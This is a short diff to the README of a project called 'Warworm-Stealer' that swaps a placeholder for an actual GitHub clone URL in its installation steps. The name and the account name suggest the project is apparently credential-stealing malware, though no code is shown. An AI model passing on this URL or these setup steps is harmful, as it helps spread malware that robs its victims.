@@ -180,7 +180,7 @@ Warworm-Stealer/
 
 ```bash
 # Clone repository
-git clone [repository-url]
+git clone https://github.com/drcrypterdotru/warworm-stealer
 cd Warworm-Stealer
 
 # Create virtual environment
